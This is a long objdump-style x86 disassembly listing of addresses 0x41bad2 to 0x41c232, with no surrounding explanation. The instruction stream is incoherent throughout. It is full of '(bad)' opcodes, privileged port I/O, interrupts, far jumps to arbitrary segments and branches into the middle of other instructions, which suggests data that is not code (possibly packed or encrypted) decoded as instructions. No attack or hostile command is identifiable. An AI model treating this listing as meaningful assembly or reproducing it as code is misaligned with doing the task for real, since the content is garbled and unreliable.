  41bad2:	xor    eax,0xd98f
  41bad7:	mov    ds:0x42c69ad6,eax
  41badc:	loopne 0x41bb50
  41bade:	pop    esi
  41badf:	add    eax,0x4d9b23f9
  41bae4:	test   BYTE PTR [ecx],dh
  41bae6:	not    BYTE PTR [esi-0x2a9db43c]
  41baec:	dec    eax
  41baed:	mov    bl,0xa1
  41baef:	mov    ah,0x1
  41baf1:	inc    ecx
  41baf2:	inc    edi
  41baf3:	ficomp WORD PTR [ebp+0x6c]
  41baf6:	clc    
  41baf7:	repz jns 0x41ba83
  41bafa:	mov    ecx,0xcb59747d
  41baff:	in     al,dx
  41bb00:	enter  0x92f3,0x46
  41bb04:	(bad)  
  41bb05:	repz sub DWORD PTR ds:0x3e164181,0xcb8d9c09
  41bb10:	jg     0x41bb11
  41bb12:	push   ss
  41bb13:	mov    esi,0x95cd6386
  41bb18:	loopne 0x41bac5
  41bb1a:	sub    eax,0xd2ac6b0e
  41bb1f:	pusha  
  41bb20:	popa   
  41bb21:	mov    ch,0x1
  41bb23:	and    al,0x94
  41bb25:	fwait
  41bb26:	xor    edx,eax
  41bb28:	aam    0x83
  41bb2a:	push   cs
  41bb2b:	inc    esp
  41bb2c:	mov    ebp,0xca33561
  41bb31:	js     0x41bb3c
  41bb33:	(bad)  
  41bb34:	sbb    eax,0xe3d57921
  41bb39:	xchg   esp,eax
  41bb3a:	ret    0xd700
  41bb3d:	push   ecx
  41bb3e:	xchg   dl,al
  41bb40:	(bad)  
  41bb41:	and    DWORD PTR [eax+0x3c],ecx
  41bb44:	fistp  DWORD PTR [eax]
  41bb46:	sub    ecx,DWORD PTR [edx+0xf978f90]
  41bb4c:	test   bh,0x31
  41bb4f:	sbb    esp,0xffffffe8
  41bb52:	inc    ebx
  41bb53:	es mov al,0xae
  41bb56:	push   eax
  41bb57:	aas    
  41bb58:	xor    DWORD PTR [ecx-0x5d0a4c3e],ebx
  41bb5e:	(bad)  
  41bb5f:	std    
  41bb60:	std    
  41bb61:	das    
  41bb62:	js     0x41bba6
  41bb64:	scas   eax,DWORD PTR es:[edi]
  41bb65:	pop    ebp
  41bb66:	stc    
  41bb67:	xchg   ebx,eax
  41bb68:	pop    es
  41bb69:	loopne 0x41bb62
  41bb6b:	add    eax,0xd0a05360
  41bb70:	pop    ebp
  41bb71:	xchg   edx,eax
  41bb72:	mov    ch,0x73
  41bb74:	fs mov bh,0x79
  41bb77:	push   edi
  41bb78:	test   BYTE PTR [esi+0x23],cl
  41bb7b:	xor    BYTE PTR [edi],ch
  41bb7d:	jne    0x41bb37
  41bb7f:	lods   eax,DWORD PTR ds:[esi]
  41bb80:	ficomp DWORD PTR ds:0x92d84350
  41bb86:	int3   
  41bb87:	jno    0x41bbe1
  41bb89:	or     BYTE PTR [esi+ebp*4],cl
  41bb8c:	in     eax,0x52
  41bb8e:	sbb    BYTE PTR [esi+0x1aefb28b],bl
  41bb94:	cs (bad) 
  41bb96:	sahf   
  41bb97:	add    ecx,eax
  41bb99:	fbld   TBYTE PTR [edi+0x55]
  41bb9c:	push   ds
  41bb9d:	sub    ch,bl
  41bb9f:	inc    ax
  41bba1:	call   DWORD PTR [ebx+0x27b24e63]
  41bba7:	stos   DWORD PTR es:[edi],eax
  41bba8:	je     0x41bc21
  41bbaa:	jecxz  0x41bbcf
  41bbac:	inc    ebx
  41bbad:	stos   BYTE PTR es:[edi],al
  41bbae:	iret   
  41bbaf:	and    al,0xf1
  41bbb1:	ficom  DWORD PTR [eax+0x23]
  41bbb4:	dec    ecx
  41bbb5:	iret   
  41bbb6:	nop
  41bbb7:	mov    cl,0x36
  41bbb9:	cmp    BYTE PTR [eax-0x15439d91],0x99
  41bbc0:	dec    edx
  41bbc1:	push   esp
  41bbc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbc3:	(bad)  
  41bbc4:	sbb    al,0x1
  41bbc6:	cmp    ecx,DWORD PTR [edx-0x3b]
  41bbc9:	xchg   ecx,eax
  41bbca:	jmp    0x41bb5e
  41bbcc:	int3   
  41bbcd:	add    bh,ah
  41bbcf:	jmp    0x41bc35
  41bbd1:	out    0x1e,eax
  41bbd3:	int    0xa2
  41bbd5:	jne    0x41bbee
  41bbd7:	cmp    ecx,0x5a
  41bbda:	nop
  41bbdb:	imul   edx,ecx,0x760dc831
  41bbe1:	cmp    DWORD PTR [edx+0x7badd2bc],esp
  41bbe7:	sub    cl,BYTE PTR [edx]
  41bbe9:	xor    eax,esi
  41bbeb:	and    dh,ch
  41bbed:	cmp    DWORD PTR [ebx],edx
  41bbef:	loop   0x41bbfc
  41bbf1:	test   DWORD PTR [edx+0x1f4ca6d3],ebx
  41bbf7:	in     eax,0xe5
  41bbf9:	adc    al,cl
  41bbfb:	mov    ebx,0xa8e3ec2c
  41bc00:	or     eax,0x620e141
  41bc05:	ds jmp 0xfccf:0x539df166
  41bc0d:	inc    esp
  41bc0e:	push   0x7f
  41bc10:	jmp    0x29958121
  41bc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc16:	ficomp DWORD PTR [edi-0x79448eca]
  41bc1c:	popa   
  41bc1d:	push   cs
  41bc1e:	lock or BYTE PTR [esp+edx*8],bh
  41bc22:	int3   
  41bc23:	add    dl,BYTE PTR [ebx+0x7b]
  41bc26:	inc    edx
  41bc27:	je     0x41bc95
  41bc29:	dec    edi
  41bc2a:	(bad)  [edi-0x424e95af]
  41bc30:	clc    
  41bc31:	mov    edx,0x91ac213a
  41bc36:	sub    BYTE PTR [edx+0x73],dl
  41bc39:	stos   DWORD PTR es:[edi],eax
  41bc3a:	mov    ds:0x7216629b,eax
  41bc3f:	sbb    BYTE PTR [edx+0xc],ah
  41bc42:	fnstenv [eax+0x67e75a7]
  41bc48:	jb     0x41bc2f
  41bc4a:	or     eax,0x1a1076a1
  41bc4f:	jns    0x41bc38
  41bc51:	mov    ebp,0x5fc930d1
  41bc56:	jns    0x41bcac
  41bc58:	loop   0x41bc19
  41bc5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc5b:	rcl    DWORD PTR [eax+edx*8-0x6],0xb
  41bc60:	xchg   ebx,eax
  41bc61:	(bad)  
  41bc62:	(bad)  
  41bc63:	mov    esi,0x36f31843
  41bc68:	ins    DWORD PTR es:[edi],dx
  41bc69:	and    DWORD PTR [ebp+0x1a0a815c],0x3c
  41bc70:	jnp    0x41bcc7
  41bc72:	fxch   st(5)
  41bc74:	inc    edx
  41bc75:	cwde   
  41bc76:	mov    cl,0x4e
  41bc78:	jns    0x41bc87
  41bc7a:	stos   DWORD PTR es:[edi],eax
  41bc7b:	lahf   
  41bc7c:	xchg   BYTE PTR [esi+0x590cd268],al
  41bc82:	and    bl,BYTE PTR [ecx]
  41bc84:	cwde   
  41bc85:	pushf  
  41bc86:	pushf  
  41bc87:	add    DWORD PTR [ebx-0x78a50ba7],0xd2c0239c
  41bc91:	pop    esp
  41bc92:	add    eax,0xe04445f9
  41bc97:	mov    WORD PTR [edi+0x37],?
  41bc9a:	sub    al,0xec
  41bc9c:	into   
  41bc9d:	ins    BYTE PTR es:[edi],dx
  41bc9e:	in     eax,0x35
  41bca0:	stos   DWORD PTR es:[edi],eax
  41bca1:	pusha  
  41bca2:	out    dx,al
  41bca3:	mov    edi,edx
  41bca5:	add    edi,DWORD PTR ds:0xddeae5e1
  41bcab:	sbb    ah,dh
  41bcad:	xchg   ecx,eax
  41bcae:	mov    ecx,0x3dcc4961
  41bcb3:	jae    0x41bd28
  41bcb5:	aam    0x94
  41bcb7:	(bad)  
  41bcb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcb9:	pop    eax
  41bcba:	loope  0x41bcd2
  41bcbc:	out    0x1c,eax
  41bcbe:	(bad)  
  41bcbf:	sti    
  41bcc0:	aaa    
  41bcc1:	dec    edx
  41bcc2:	jo     0x41bcf5
  41bcc4:	out    0x38,eax
  41bcc6:	cmp    BYTE PTR [edi],0xe8
  41bcc9:	adc    DWORD PTR [eax-0x41ef65b9],esi
  41bccf:	push   ss
  41bcd0:	leave  
  41bcd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcd2:	lahf   
  41bcd3:	push   ss
  41bcd4:	sbb    al,0xa
  41bcd6:	ret    0x1d1d
  41bcd9:	mov    ebp,0x321bd482
  41bcde:	cmp    DWORD PTR [ecx],edi
  41bce0:	sbb    al,0x54
  41bce2:	mov    bh,0x5e
  41bce4:	mov    cl,0x37
  41bce6:	dec    edi
  41bce7:	(bad)  
  41bce8:	neg    BYTE PTR [eax]
  41bcea:	dec    eax
  41bceb:	sar    DWORD PTR [eax+ebx*4+0x1c],cl
  41bcef:	shr    BYTE PTR [edi+ebx*4-0x39],0x51
  41bcf4:	(bad)  [edi-0x48fa1121]
  41bcfa:	lock pop ebx
  41bcfc:	or     eax,0x8041bca9
  41bd01:	and    dh,ch
  41bd03:	iret   
  41bd04:	les    ecx,FWORD PTR [ebx+0x7]
  41bd07:	(bad)  
  41bd08:	mov    esp,0x4c16ba7b
  41bd0d:	mov    eax,0x7a987b17
  41bd12:	test   BYTE PTR [bp+di-0x60],bh
  41bd16:	push   edx
  41bd17:	push   edx
  41bd18:	icebp  
  41bd19:	cli    
  41bd1a:	int    0x69
  41bd1c:	mov    edx,0x1dd36e79
  41bd21:	or     BYTE PTR [esp+esi*4],ah
  41bd24:	mov    eax,0xad244ca0
  41bd29:	mov    ecx,0x1b25288d
  41bd2e:	adc    eax,0x2c00f9d6
  41bd33:	jecxz  0x41bd75
  41bd35:	add    dl,BYTE PTR [esi-0x1]
  41bd38:	jp     0x41bd70
  41bd3a:	mov    ah,0x72
  41bd3c:	mov    ebx,0x947a9f3a
  41bd41:	inc    edx
  41bd42:	call   0xb55e:0xae91078f
  41bd49:	mov    eax,0x3801d4f4
  41bd4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd4f:	or     BYTE PTR [ebx],ch
  41bd51:	push   esi
  41bd52:	iret   
  41bd53:	imul   esi,DWORD PTR [edx+eiz*2],0x84f4a2e
  41bd5a:	mov    ebx,0xadcae279
  41bd5f:	dec    ebp
  41bd60:	jno    0x41bd3c
  41bd62:	adc    ecx,DWORD PTR [ebx]
  41bd64:	xchg   edx,eax
  41bd65:	inc    ebx
  41bd66:	cs mov edi,0xf601f007
  41bd6c:	mov    ds,WORD PTR [ebp+0x72]
  41bd6f:	sbb    eax,0x18ae0118
  41bd74:	mov    edx,ds
  41bd76:	mov    ecx,DWORD PTR [eax+0x54]
  41bd79:	mov    ebx,0x8435a8cc
  41bd7e:	leave  
  41bd7f:	(bad)  
  41bd80:	imul   ebp,DWORD PTR [esi+0x79c57dd5],0x6acd285c
  41bd8a:	mov    cl,0x1c
  41bd8c:	ins    BYTE PTR es:[edi],dx
  41bd8d:	add    edx,ebx
  41bd8f:	repz and DWORD PTR [edx-0x48],esi
  41bd93:	call   0xf60e:0xe3ff80cc
  41bd9a:	mov    esi,0x81b4d383
  41bd9f:	push   0x47
  41bda1:	push   edi
  41bda2:	outs   dx,BYTE PTR ds:[esi]
  41bda3:	call   0x368d12af
  41bda8:	or     BYTE PTR [edx+0x1a68e4dc],bl
  41bdae:	test   BYTE PTR [edi],cl
  41bdb0:	sti    
  41bdb1:	adc    edi,edx
  41bdb3:	and    DWORD PTR [ebp-0x74],esp
  41bdb6:	popf   
  41bdb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdb8:	ss imul esp,edi,0x945a2af4
  41bdbf:	fcmovbe st,st(1)
  41bdc1:	clc    
  41bdc2:	out    dx,eax
  41bdc3:	loope  0x41be24
  41bdc5:	push   0x17317e4
  41bdca:	shr    BYTE PTR [ebx+0x11],1
  41bdcd:	gs aad 0x9b
  41bdd0:	xor    eax,DWORD PTR [eax+esi*8+0x677fd286]
  41bdd7:	mov    dl,0xc5
  41bdd9:	xchg   ebx,eax
  41bdda:	imul   esp,DWORD PTR [edx],0xbeec7fd5
  41bde0:	xor    al,dh
  41bde2:	add    al,0xaf
  41bde4:	push   ebp
  41bde5:	xchg   BYTE PTR [esi+0x63c37a27],bl
  41bdeb:	mov    bh,0x40
  41bded:	leave  
  41bdee:	xchg   DWORD PTR [ebp+0x23929e5c],edi
  41bdf4:	adc    ebp,eax
  41bdf6:	aaa    
  41bdf7:	cwde   
  41bdf8:	mov    edx,0xeea800cf
  41bdfd:	fnstenv [edx+esi*8]
  41be00:	clc    
  41be01:	mov    ebp,0xa03db648
  41be06:	jmp    0x9e4e:0x1fbec66d
  41be0d:	outs   dx,BYTE PTR ds:[esi]
  41be0e:	stc    
  41be0f:	adc    bh,al
  41be11:	leave  
  41be12:	xchg   BYTE PTR ds:0x638d0c50,al
  41be18:	xchg   ebx,eax
  41be19:	push   0xf870d5a3
  41be1e:	jae    0x41bdb8
  41be20:	jb     0x41bdde
  41be22:	data16 mov ch,0x79
  41be25:	out    0xa3,al
  41be27:	push   es
  41be28:	pop    edi
  41be29:	fwait
  41be2a:	mov    esp,0xcb17ccfd
  41be2f:	ds fdivp st(2),st
  41be32:	mov    ds:0xdec7975e,al
  41be37:	fdivr  QWORD PTR [ebp+0xb]
  41be3a:	mov    BYTE PTR [ebx+esi*1],dh
  41be3d:	repz neg DWORD PTR [edx]
  41be40:	add    al,0x1d
  41be42:	jecxz  0x41be6c
  41be44:	arpl   WORD PTR [edx-0x4e],sp
  41be47:	dec    ecx
  41be48:	dec    eax
  41be49:	add    al,0xfa
  41be4b:	mov    gs:0xddb6d006,al
  41be51:	sbb    DWORD PTR [ecx+ebp*1],edi
  41be54:	mov    BYTE PTR [ecx],dh
  41be56:	(bad)  
  41be58:	jno    0x41be4c
  41be5a:	call   0xf4d91ccc
  41be5f:	inc    esp
  41be60:	mov    edx,0x9d451d8d
  41be65:	cmc    
  41be66:	xchg   esp,eax
  41be67:	lds    eax,FWORD PTR [ebx+0x73]
  41be6a:	push   ecx
  41be6b:	xchg   ebp,eax
  41be6c:	mov    ah,ch
  41be6e:	push   edx
  41be6f:	clc    
  41be70:	ja     0x41be4e
  41be72:	call   0xb863c75f
  41be77:	in     eax,dx
  41be78:	das    
  41be79:	adc    bh,bl
  41be7b:	adc    DWORD PTR [eax+edx*2+0x25362778],edi
  41be82:	jae    0x41beb2
  41be84:	cmp    ebp,DWORD PTR [eiz*2+0x12af6aeb]
  41be8b:	std    
  41be8c:	arpl   bp,dx
  41be8e:	pop    ebx
  41be8f:	das    
  41be90:	push   es
  41be91:	sahf   
  41be92:	and    esp,0xffffff96
  41be95:	test   al,0x22
  41be97:	aad    0xfc
  41be99:	and    DWORD PTR [ebx],edi
  41be9b:	sbb    DWORD PTR [esi-0x10],edx
  41be9e:	xchg   esp,eax
  41be9f:	jne    0x41be8a
  41bea1:	jg     0x41be64
  41bea3:	es dec ecx
  41bea5:	xor    esi,DWORD PTR [edx-0x5c]
  41bea8:	adc    DWORD PTR [ebx+ebx*2],0x79
  41beac:	mov    eax,0xb3a4405f
  41beb1:	xchg   ebx,eax
  41beb2:	pop    esp
  41beb3:	push   ebx
  41beb4:	xchg   edi,eax
  41beb5:	popa   
  41beb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beb7:	inc    esp
  41beb8:	adc    BYTE PTR [eax-0x7],ch
  41bebb:	and    dl,dh
  41bebd:	in     al,dx
  41bebe:	push   esi
  41bebf:	int    0xe9
  41bec1:	cmovae ebp,DWORD PTR ds:0xaf873cfb
  41bec8:	inc    ecx
  41bec9:	lock into 
  41becb:	mov    ebx,0xff24e258
  41bed0:	cmp    DWORD PTR [edi],eax
  41bed2:	mov    esp,0x44538782
  41bed7:	stos   DWORD PTR es:[edi],eax
  41bed8:	mov    dh,0xde
  41beda:	jp     0x41bece
  41bedc:	ret    
  41bedd:	add    bl,al
  41bedf:	and    bh,ah
  41bee1:	pop    es
  41bee2:	xor    BYTE PTR [esi+0x6db65713],bl
  41bee8:	dec    edx
  41bee9:	(bad)  
  41beea:	and    al,0xc2
  41beec:	retf   0x3526
  41beef:	xchg   BYTE PTR gs:[ebx+0x20],dl
  41bef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bef4:	imul   ecx,DWORD PTR [edi],0xffffff83
  41bef7:	cld    
  41bef8:	ds pop eax
  41befa:	jbe    0x41bf5d
  41befc:	push   ebp
  41befd:	inc    esi
  41befe:	mov    al,0x10
  41bf00:	xchg   ebp,eax
  41bf01:	and    cl,cl
  41bf03:	mov    ch,0x1e
  41bf05:	fst    QWORD PTR [edx-0x2f7cfd70]
  41bf0b:	div    BYTE PTR [ecx-0x57]
  41bf0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf0f:	das    
  41bf10:	mov    eax,ds:0xa7f66501
  41bf15:	and    ebx,eax
  41bf17:	fcom   QWORD PTR [ebp+0x2968a781]
  41bf1d:	(bad)  
  41bf1e:	out    dx,eax
  41bf1f:	cmp    cl,dl
  41bf21:	je     0x41bf5e
  41bf23:	dec    edi
  41bf24:	pushf  
  41bf25:	out    0x3e,al
  41bf27:	mov    dh,0xf1
  41bf29:	fadd   DWORD PTR [edi+0x3363bedf]
  41bf2f:	xchg   ecx,esi
  41bf31:	xor    eax,0x45f3f078
  41bf36:	sub    BYTE PTR [esi+0x7e],0xc9
  41bf3a:	mov    edi,0x1ee43621
  41bf3f:	jp     0x41bf91
  41bf41:	push   es
  41bf42:	mov    es,WORD PTR [edx]
  41bf44:	jle    0x41bee6
  41bf46:	push   ecx
  41bf47:	ret    
  41bf48:	cmp    edi,eax
  41bf4a:	add    DWORD PTR ds:0xe47fa236,0x36
  41bf51:	jmp    0xedc089e6
  41bf56:	adc    ebp,DWORD PTR [esi]
  41bf58:	xchg   ebx,eax
  41bf59:	dec    ebx
  41bf5a:	add    edi,ebp
  41bf5c:	cmp    ah,BYTE PTR [ebx+0x1499b98e]
  41bf62:	dec    esi
  41bf63:	inc    edi
  41bf64:	fldenv [esi-0x4e]
  41bf67:	ins    DWORD PTR es:[edi],dx
  41bf68:	dec    edx
  41bf69:	xchg   edx,eax
  41bf6a:	push   ebp
  41bf6b:	mov    eax,0x88b5badf
  41bf70:	jo     0x41bfcd
  41bf72:	xor    esp,DWORD PTR [edi+0x12]
  41bf75:	int    0xf1
  41bf77:	out    0x2a,eax
  41bf79:	or     ebp,esp
  41bf7b:	ds dec ecx
  41bf7d:	in     al,0x7a
  41bf7f:	imul   edx,DWORD PTR [edx],0xffffff88
  41bf82:	mov    dh,0x7a
  41bf84:	sub    edi,ebp
  41bf86:	add    ebx,ecx
  41bf88:	lea    eax,[ecx+0x29318e20]
  41bf8e:	inc    ebp
  41bf8f:	cli    
  41bf90:	pushf  
  41bf91:	imul   BYTE PTR [ecx]
  41bf93:	(bad)  
  41bf94:	xor    DWORD PTR [ecx],esp
  41bf96:	loopne 0x41c00e
  41bf98:	test   eax,0x1bbf52e
  41bf9d:	sub    BYTE PTR [ebx],bh
  41bf9f:	stos   DWORD PTR es:[edi],eax
  41bfa0:	jmp    0x41bf33
  41bfa2:	xchg   esp,eax
  41bfa3:	leave  
  41bfa4:	inc    ebp
  41bfa5:	loope  0x41bf6e
  41bfa7:	inc    edx
  41bfa8:	mov    al,ds:0x866d0844
  41bfad:	pusha  
  41bfae:	ss pop ebx
  41bfb0:	mov    edi,0x827b675
  41bfb5:	dec    eax
  41bfb6:	jo     0x41bf53
  41bfb8:	fld    TBYTE PTR ss:[edi-0x4]
  41bfbc:	pop    ss
  41bfbd:	shl    dl,1
  41bfbf:	or     DWORD PTR [eax-0x3f],edi
  41bfc2:	jle    0x41c032
  41bfc4:	inc    edx
  41bfc5:	dec    ebp
  41bfc6:	jbe    0x41c01d
  41bfc8:	mov    ?,edx
  41bfca:	adc    edx,DWORD PTR [eax]
  41bfcc:	sahf   
  41bfcd:	fstp   QWORD PTR [eax]
  41bfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfd0:	cld    
  41bfd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfd2:	scas   eax,DWORD PTR es:[edi]
  41bfd3:	jecxz  0x41c001
  41bfd5:	xchg   ebx,eax
  41bfd6:	or     ebp,DWORD PTR [eax]
  41bfd8:	xchg   ebx,eax
  41bfd9:	add    DWORD PTR [edx-0x688593d9],ecx
  41bfdf:	xor    ebx,0xa88f805a
  41bfe5:	jl     0x41c03c
  41bfe7:	xor    al,dl
  41bfe9:	lods   al,BYTE PTR ds:[esi]
  41bfea:	int3   
  41bfeb:	repz cs addr16 out 0x10,eax
  41bff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bff1:	cmp    eax,0xc4269ca8
  41bff6:	push   DWORD PTR [edx-0x3dfa9cfb]
  41bffc:	pushf  
  41bffd:	sub    BYTE PTR [edi-0x46],0xc2
  41c001:	push   0xffffffbf
  41c003:	(bad)  
  41c004:	push   ss
  41c005:	mov    ch,0xbc
  41c007:	std    
  41c008:	fisub  WORD PTR [esi-0x43]
  41c00b:	dec    edx
  41c00c:	cmp    BYTE PTR [edx+0x33aafbd6],al
  41c012:	in     al,0x8e
  41c014:	ss jae 0x41bfae
  41c017:	leave  
  41c018:	js     0x41c01e
  41c01a:	xchg   ecx,eax
  41c01b:	fisttp QWORD PTR [edx-0x2c09e9a2]
  41c021:	aas    
  41c022:	sub    DWORD PTR [eax+0x7c],ebx
  41c025:	dec    ebx
  41c026:	std    
  41c027:	out    dx,eax
  41c028:	add    ebx,DWORD PTR ds:0xff777eca
  41c02e:	dec    ecx
  41c02f:	mov    ds:0x9a3d0ebd,al
  41c034:	ins    BYTE PTR es:[edi],dx
  41c035:	cdq    
  41c036:	(bad)  
  41c037:	sar    BYTE PTR [esi+esi*1],0xfd
  41c03b:	jnp    0x41c046
  41c03d:	mov    BYTE PTR [ebp+0xd],dh
  41c040:	rcr    ebp,0xcc
  41c043:	and    BYTE PTR [ebx+0x5c],dl
  41c046:	mov    ds:0x119aa29d,al
  41c04b:	cmp    DWORD PTR [ecx],ecx
  41c04d:	mov    al,ds:0xd609d3dc
  41c052:	push   edi
  41c053:	sbb    DWORD PTR [ebx-0x66],0x8
  41c057:	(bad)  
  41c058:	xchg   ecx,eax
  41c059:	xchg   ecx,eax
  41c05a:	adc    DWORD PTR [edx+0x0],edx
  41c05d:	mov    edx,0x5edeb4bd
  41c062:	inc    esp
  41c063:	push   ebx
  41c064:	mov    ds:0xee6d7bcb,eax
  41c069:	and    BYTE PTR [edx-0x37],dl
  41c06c:	arpl   WORD PTR [ebp+0x101ec164],si
  41c072:	call   0xe90e411a
  41c077:	ds sbb eax,0x9e64d85b
  41c07d:	idiv   BYTE PTR [edx]
  41c07f:	in     eax,0x61
  41c081:	fsubr  DWORD PTR [ebx+ebx*2-0x2a]
  41c085:	dec    eax
  41c086:	scas   eax,DWORD PTR es:[edi]
  41c087:	rcl    ch,cl
  41c089:	mov    ch,0xcf
  41c08b:	mov    bl,0x7
  41c08d:	pop    eax
  41c08e:	enter  0x606f,0x10
  41c092:	cmp    al,0xb8
  41c094:	pop    ecx
  41c095:	into   
  41c096:	hlt    
  41c097:	call   DWORD PTR [edi+0x4347318e]
  41c09d:	mov    WORD PTR [ecx+ebp*4],ds
  41c0a0:	jl     0x41c0f7
  41c0a2:	pusha  
  41c0a3:	mov    eax,ebx
  41c0a5:	repz cli 
  41c0a7:	mov    BYTE PTR [edx],cl
  41c0a9:	mov    eax,ds:0xe727430f
  41c0ae:	xchg   DWORD PTR [eax*8-0x6055e45f],esp
  41c0b5:	xchg   DWORD PTR [ecx],ebx
  41c0b7:	lods   al,BYTE PTR ds:[esi]
  41c0b8:	jmp    0xff2d293d
  41c0bd:	call   0xcfac:0xc5d14475
  41c0c4:	cmp    BYTE PTR [edi+0x20],bh
  41c0c7:	cdq    
  41c0c8:	cld    
  41c0c9:	into   
  41c0ca:	addr16 sti 
  41c0cc:	push   ebx
  41c0cd:	cmp    DWORD PTR [edx],esi
  41c0cf:	and    DWORD PTR [ebp+ebp*2+0x9a3efb2],ebx
  41c0d6:	sub    eax,0x8da838d
  41c0db:	js     0x41c088
  41c0dd:	adc    ebp,DWORD PTR ss:[edi+0x72]
  41c0e1:	nop
  41c0e2:	sahf   
  41c0e3:	jbe    0x41c10b
  41c0e5:	adc    DWORD PTR [eax+0x44],esp
  41c0e8:	cs dec esi
  41c0ea:	test   eax,0x9079899c
  41c0ef:	xlat   BYTE PTR ds:[ebx]
  41c0f0:	adc    cl,BYTE PTR [esi+ecx*1]
  41c0f3:	aaa    
  41c0f4:	outs   dx,DWORD PTR ds:[esi]
  41c0f5:	or     DWORD PTR [ebp+0x5a],ecx
  41c0f8:	(bad)
  41c0fc:	cmp    edi,esp
  41c0fe:	aam    0x9c
  41c100:	mov    ebx,0xd9a1a39e
  41c105:	mov    cl,0xbe
  41c107:	outs   dx,DWORD PTR ds:[esi]
  41c108:	out    dx,al
  41c109:	inc    esp
  41c10a:	mov    esi,0xb1e22e7a
  41c10f:	imul   ecx,DWORD PTR [ebp-0x57518a61],0xf1ea5c83
  41c119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c11a:	ins    DWORD PTR es:[edi],dx
  41c11b:	adc    DWORD PTR [edi+edi*1+0x7008a66d],eax
  41c122:	mov    cl,0x2d
  41c124:	add    BYTE PTR [esi+0x1f],0xfd
  41c128:	mov    dh,0x1e
  41c12a:	push   edx
  41c12b:	ja     0x41c158
  41c12d:	out    0xf1,al
  41c12f:	icebp  
  41c130:	pop    ss
  41c131:	daa    
  41c132:	and    al,0x43
  41c134:	adc    DWORD PTR [edi+ecx*8+0x3d12dc3a],eax
  41c13b:	adc    al,0xfc
  41c13d:	mov    esp,0x2a2a6bb9
  41c142:	arpl   WORD PTR [ebp-0x714e7b0e],si
  41c148:	inc    edx
  41c149:	les    ebp,FWORD PTR [ecx]
  41c14b:	dec    ebx
  41c14c:	adc    eax,0xb2eb9ef
  41c151:	clc    
  41c152:	lods   eax,DWORD PTR ds:[esi]
  41c153:	cli    
  41c154:	leave  
  41c155:	neg    DWORD PTR ds:0x987558f5
  41c15b:	std    
  41c15c:	pop    DWORD PTR [edi-0x72fb8d0f]
  41c162:	xor    al,0x6c
  41c164:	int3   
  41c165:	and    DWORD PTR [ebp+0x4d],eax
  41c168:	mov    esi,0xbd338ff0
  41c16d:	jg     0x41c139
  41c16f:	(bad)  
  41c170:	das    
  41c171:	ins    BYTE PTR es:[edi],dx
  41c172:	adc    BYTE PTR [esi+ebx*4+0x68],ch
  41c176:	adc    BYTE PTR [edi+0x55],ch
  41c179:	jnp    0x41c139
  41c17b:	test   BYTE PTR [edx],0xd8
  41c17e:	xchg   DWORD PTR [ebp-0x31b0b2ef],edx
  41c184:	inc    esi
  41c185:	sub    DWORD PTR [esi+esi*4+0x5b],ebx
  41c189:	pop    ebp
  41c18a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c18b:	sbb    eax,0x6eca1fe3
  41c190:	loop   0x41c1e5
  41c192:	fsubr  DWORD PTR [ebp-0x2e]
  41c195:	dec    ebx
  41c196:	jmp    0xaf59:0x5d5ecb94
  41c19d:	pop    ds
  41c19e:	and    esp,DWORD PTR [edx]
  41c1a0:	outs   dx,BYTE PTR ds:[esi]
  41c1a1:	popf   
  41c1a2:	mov    esi,0x550c0bbd
  41c1a7:	cs add al,0xb9
  41c1aa:	retf   0x78dd
  41c1ad:	clc    
  41c1ae:	pusha  
  41c1af:	or     BYTE PTR [ebp-0x7ebb9648],dh
  41c1b5:	(bad)  [edx-0x72]
  41c1b8:	sbb    dl,BYTE PTR [esi-0x2c761242]
  41c1be:	ins    DWORD PTR es:[edi],dx
  41c1bf:	mov    ebx,0x3d071185
  41c1c4:	push   ebx
  41c1c5:	sub    BYTE PTR [edi-0x3f],bh
  41c1c8:	cmp    dl,0xc1
  41c1cb:	ret    
  41c1cc:	mov    esp,DWORD PTR [esi]
  41c1ce:	sub    edi,eax
  41c1d0:	push   ebp
  41c1d1:	out    0x7c,eax
  41c1d3:	and    eax,DWORD PTR [ebp-0x67a46e98]
  41c1d9:	fld    QWORD PTR [edx]
  41c1db:	sbb    DWORD PTR [ebp+0x2ec3e728],esi
  41c1e1:	add    edi,DWORD PTR [ebp-0x77b08884]
  41c1e7:	jnp    0x41c189
  41c1e9:	dec    edi
  41c1ea:	lods   al,BYTE PTR ds:[esi]
  41c1eb:	xchg   edx,eax
  41c1ec:	mov    dh,0xd1
  41c1ee:	jecxz  0x41c1c2
  41c1f0:	addr16 leave 
  41c1f2:	pop    ds
  41c1f3:	out    dx,eax
  41c1f4:	adc    BYTE PTR [esi+0x2a],al
  41c1f7:	inc    eax
  41c1f8:	(bad)  
  41c1f9:	pop    eax
  41c1fa:	add    DWORD PTR [edi-0x4],ebx
  41c1fd:	mov    al,ds:0x3ce7ebfe
  41c202:	jle    0x41c267
  41c204:	loop   0x41c21f
  41c206:	int    0x67
  41c208:	(bad)  
  41c209:	push   ss
  41c20a:	and    DWORD PTR [ebp+0x5a],ebp
  41c20d:	sub    BYTE PTR [esi+edx*2+0x4b],dh
  41c211:	or     DWORD PTR [ecx],ebp
  41c213:	mov    esp,0xc3a628e5
  41c218:	mov    eax,0x1d72d3c7
  41c21d:	fwait
  41c21e:	cmp    DWORD PTR [edi+0x15],edi
  41c221:	and    al,0x68
  41c223:	pop    ecx
  41c224:	inc    ebx
  41c225:	fcmove st,st(4)
  41c227:	shl    al,cl
  41c229:	push   eax
  41c22a:	add    ah,BYTE PTR [eax+0x76]
  41c22d:	xchg   DWORD PTR [ebx-0x1a],esp
  41c230:	loopne 0x41c206
  41c232:	fstp   QWORD PTR [ecx]
